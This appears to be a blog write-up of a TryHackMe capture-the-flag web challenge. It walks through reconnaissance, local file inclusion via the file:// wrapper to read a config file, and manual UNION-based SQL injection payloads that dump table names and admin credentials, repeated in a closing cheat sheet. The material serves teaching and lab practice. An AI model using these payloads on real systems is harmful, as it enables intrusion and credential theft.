---
layout: post
title: "Recruit Writeup: From LFI to SQLi on the Recruit Portal"
date: 2026-06-27 10:00:00 +0200
categories: [CTF, TryHackMe]
tags: [lfi, sqli, nmap, gobuster, apache, penetration-testing, beginner]
description: "A complete walkthrough of a web-based CTF challenge, covering initial reconnaissance, exploiting Local File Inclusion (LFI) via protocol wrappers, and chaining an In-Band SQL Injection to gain Administrator access."
excerpt: "When a company rushes a new web portal out the door, security is usually the first thing left behind. In this CTF writeup, we map out a vulnerable recruitment application, turn a simple file-fetching API into an LFI exploit, and use a classic UNION SQL injection to steal the admin's keys to the kingdom."
---

Welcome back, fellow hackers! 👋

Today, we are diving into a fun and highly realistic web challenge involving a fictional company's brand-new recruitment portal. As we all know, when an organization rushes a "new feature" out the door, security is usually the first thing left behind in the dust. 

Let's read the challenge description to set the stage:

> Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities. Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?

Our objective is clear: gain an initial foothold, escalate our privileges, and grab that admin account! Grab your coffee, put on your hacker hat, and let's dive right in.

---

### Initial Reconnaissance

As any good penetration tester knows, engagements are broken down into phases, and the absolute most important phase is enumeration and information gathering. If you collect solid intelligence, you write a successful pentest report. It's that simple. 

From the brief, we know we are dealing with a web server hosting a new login portal. Our first step is to identify the web stack and see what doors (ports) are left open. 

To grab a quick fingerprint of the web stack, I love to use a simple `curl` command to fetch the HTTP headers while my automated port scanner runs in the background.

```bash
curl -sI http://<TARGET_IP>:80
```

*Why we run it:*
* `-s` &rarr; Silent mode (hides the progress bar and error messages).
* `-I` &rarr; Fetches only the HTTP headers, which often reveal the server software and version.

![curl output.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/CurlOutput.png){: .shadow }

Bingo! Looking at the output, we should immediately look for the `Server` header. In this case, it returned `Apache/2.4.41 (Ubuntu)`. 

Right away, we know we are dealing with an Apache web server running on an Ubuntu machine. Based on this, I was about 70% sure we were dealing with a classic LAMP stack (Linux, Apache, MySQL, PHP), but it's always best to verify before making assumptions.

Before going too deep into the web application, let's fire off Nmap to see if there are any other open ports. 

```bash
nmap -O -sC -sV -p- <TARGET_IP> -T4
```

*Why we run it:*
* `-O` &rarr; Attempts to identify the host Operating System.
* `-sC` &rarr; Runs the default suite of Nmap scripts (NSE) for basic vulnerability checking.
* `-sV` &rarr; Probes open ports to identify service versions.
* `-p-` &rarr; Scans all 65,535 TCP ports (leave no stone unturned!).
* `-T4` &rarr; Increases the scan speed (great for CTFs, but use a slower profile in real, fragile environments).

![Nmap output.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/NmapOutput.png){: .shadow }

While Nmap was running, I quickly checked the internet for any known CVEs related to Apache 2.4.41, but came up empty-handed. Moving back to the Nmap output, we can see three open ports: SSH, DNS, and HTTP. 

> 💡 **Pentesting Tip:** In a real-world pentest, Nmap also flagged that the `HttpOnly` flag was set to false on a cookie. While not critical for this CTF, that is a great finding to toss in your final professional report!

Since the challenge explicitly tells us to test the *new web application feature*, let's not make the mistake of falling down SSH or DNS rabbit holes just yet. With a login portal on the site, there is almost certainly a database on the backend. We just need to figure out which one.

---

### Hunting for Hidden Directories

While manual enumeration of well-known directories is great, let's work smarter, not harder. I fired up Gobuster to brute-force the web directories using the trusty SecLists `common.txt` wordlist.

```bash
gobuster dir -u http://<TARGET_IP>:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x bak,txt,html,php,js -t 20
```

*Why we run it:*
* `dir` &rarr; Specifies we are using directory brute-forcing mode.
* `-u` &rarr; The target URL.
* `-w` &rarr; The path to our wordlist.
* `-x` &rarr; Tells Gobuster to specifically look for files with these extensions (super helpful for finding hidden backups or PHP files!).
* `-t 20` &rarr; Sets the number of concurrent threads to 20 for a speed boost.

While Gobuster was happily churning away, I took a manual look at the login portal. 

![the login page rendering.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/LoginPage.png){: .shadow }
![the login page HTML source code.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/LoginPageSourceCode.png){: .shadow }

By inspecting the source code, I noticed the login form calls `index.php` to validate credentials. More importantly, I found a fascinating link to another endpoint describing an API call used for "reading CVs". 

![the CV Documentation API endpoint.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/APIReadingFiles.png){: .shadow }

This immediately got my hacker senses tingling—an endpoint designed to fetch files locally is a prime suspect for a Local File Inclusion (LFI) vulnerability! 

Before going completely down the LFI rabbit hole, I checked back on our Gobuster scan. Oh yeah, we hit some juicy stuff!

![Gobuster results.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/GobusterOutput.png){: .shadow }

Gobuster uncovered a configuration file, a `/mail` directory, a `sitemap.xml`, and an `/assets` folder. 

---

### Connecting the Dots

Remember: every finding you discover should be written down because you will highly likely need it later. 

I immediately went snooping in the `/mail` directory and found an absolute golden ticket: a message giving a hint about the usernames and passwords for both the HR and Administrative accounts. The most critical piece of info? **The password for the HR account is stored directly inside the configuration file!**

> 📝 **Note:** It's always better to see the full picture before exploiting. Even though I found this golden ticket, I still quickly checked `sitemap.xml` and the `/assets` folder just to be thorough. They ended up being dead ends, but thoroughness is a pentester's best trait.

---

### Exploiting Local File Inclusion (LFI)

Now, it was time to pivot back to that API endpoint. My goal was simple: use the CV-reading API to read the configuration file and steal the HR password.

I'm not going to lie, I made some totally silly mistakes here. Reading the API documentation, I started throwing every standard URL structure I could think of at the endpoint:

* `http://<TARGET_IP>/index.php`
* `http://localhost/index.php`
* `http://127.0.0.1/index.php`
* `index.php`

Every single attempt spat back the exact same error message:

> Only local files are allowed

![File API error.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/LocalFileError.png){: .shadow }

I was stuck. After scratching my head (and using an AI assistant to bounce ideas off of—which is a totally valid way to realize you're missing something obvious!), I realized my glaring error. 

I had completely forgotten about protocol wrappers! If the server demands a *local file*, we should use the `file://` scheme. 

I quickly tested `file://localhost/index.php` (which gave me an error), and then finally, the magic bullet:

```text
file://index.php
```

Voila! We have confirmed Local File Inclusion (LFI). By using this payload, I was able to read the actual PHP source code of `index.php`, which perfectly lined up with the clues we found in the `/mail` directory.

![index.php source code.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/IndexPhpSourceCode.png){: .shadow }

Now for the main event: I pointed our LFI payload at the configuration file. 

![The configuration file revealing the HR credentials.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/ConfigPhpSourceCode.png){: .shadow }

Success! We successfully snagged the HR account password.

---

### Discovering SQL Injection

Armed with the HR credentials, I logged into the portal and immediately secured our first flag (the User Flag)! 

Looking around the HR dashboard, the only feature available was a candidate search function. Whenever you see a search bar that queries a database to display results, your first instinct should always be to test for SQL Injection (SQLi). 

I dropped a simple single quote (`'`) into the search bar, and boom—the application threw a verbose error.

![The SQL error message.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/SQLError.png){: .shadow }

This error confirmed two things:
1. Our backend database is indeed **MySQL**.
2. Because the application takes the results of the SQL query and displays them directly on the page, we are dealing with an **In-Band SQL Injection**. 

This means we can use the `UNION` technique to append our own malicious queries to the original one and extract data straight to our screen!

---

### Extracting Database Information

To execute a UNION-based SQL injection, the first rule is that our injected query must return the exact same number of columns as the original query. We figure this out by incrementing the number of columns in our payload until the page stops throwing errors.

* `a' UNION SELECT 1#` &rarr; Error
* `a' UNION SELECT 1,2#` &rarr; Error
* `a' UNION SELECT 1,2,3#` &rarr; Error
* `a' UNION SELECT 1,2,3,4#` &rarr; **Success! No error.**

![The Union Successful injection.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/SuccessfulUnion.png){: .shadow }

Awesome, the original query uses 4 columns. Even better, we can see those placeholder numbers (`1`, `2`, `3`, `4`) reflected on the web page. This tells us exactly which column positions we can replace with data-gathering functions.

Let's extract the database name first. We need this to query the information schema in the next step.

```sql
a' UNION SELECT 1,2,3,database()#
```

![The extracted database name.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/ExtractDatabaseName.png){: .shadow }

Next, we need to list the tables inside that specific database by querying MySQL's built-in `information_schema.tables`:

```sql
a' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'#
```
*(Note: Replace `database_name` with the actual name we found in the previous step).*

![The dumped table names.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/TablesDumb.png){: .shadow }

Once the table names were displayed on the screen, I spotted our target table (the one likely holding the administrator credentials). Now, we need to dump its columns:

```sql
a' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'#
```
*(Note: Replace `target_table` with the table you want to discover).*

![The dumped column names.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/DumbColumnName.png){: .shadow }

Finally, the grand finale. We know the table and we know the columns. Let's dump the administrator credentials! 

```sql
a' UNION SELECT 1,2,3,group_concat(column1,':',column2 SEPARATOR '<br>') FROM target_table#
```
*(Note: `column1` and `column2` represent the username and password columns we just discovered).*

![The extracted Administrator credentials.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/ExtractCredential.png){: .shadow }

---

### Becoming Administrator

With those administrator credentials successfully extracted via SQLi, I logged out of the HR account, logged back into the portal as the Administrator, and captured the root flag! 

**[Insert screenshot of login as admin]**![login as admin.](https://safsecmedia.blob.core.windows.net/images/THM/Recruit/LoginAdmin.png){: .shadow }

---

## Lessons Learned

This was a fantastic challenge that highlighted a few core pentesting concepts:

* **Thorough Enumeration Wins:** If we hadn't used Gobuster to find the `/mail` directory, we wouldn't have known that the HR credentials were hiding in the configuration file. 
* **Don't Overthink the Basics:** When testing for Local File Inclusion, it's easy to get caught up in complex bypasses. Sometimes, you just need to remember basic protocol wrappers like `file://`.
* **Understand Manual SQLi:** Automated tools like SQLmap are great, but understanding how to manually exploit an In-Band UNION SQL injection is a mandatory skill for any hacker. Knowing how to query the `information_schema` will save you when automated tools fail.

Cheers,
**SafSec**

---

## Command Cheat Sheet & Tool Summary

### Reconnaissance & Enumeration
* **cURL** (`curl`): Used for quick HTTP requests and banner grabbing.
  * `curl -sI http://<TARGET_IP>:80`
* **Nmap** (`nmap`): The ultimate network mapping tool used to discover open ports and services.
  * `nmap -O -sC -sV -p- <TARGET_IP> -T4`
* **Gobuster** (`gobuster`): A blazing-fast directory and DNS brute-forcing tool.
  * `gobuster dir -u http://<TARGET_IP>:80 -w <wordlist_path> -x bak,txt,html,php,js -t 20`

### Local File Inclusion (LFI)
* **File Protocol Wrapper:** Used to fetch local files directly from the server's filesystem when HTTP/URL requests are blocked.
  * `file://index.php`

### Manual UNION-Based SQLi
1. **Find column count:** `a' UNION SELECT 1,2,3,4#`
2. **Get Database Name:** `a' UNION SELECT 1,2,3,database()#`
3. **Extract Tables:** `a' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'db_name'#`
4. **Extract Columns:** `a' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'#`
5. **Dump Target Data:** `a' UNION SELECT 1,2,3,group_concat(user_col,':',pass_col SEPARATOR '<br>') FROM target_table#`
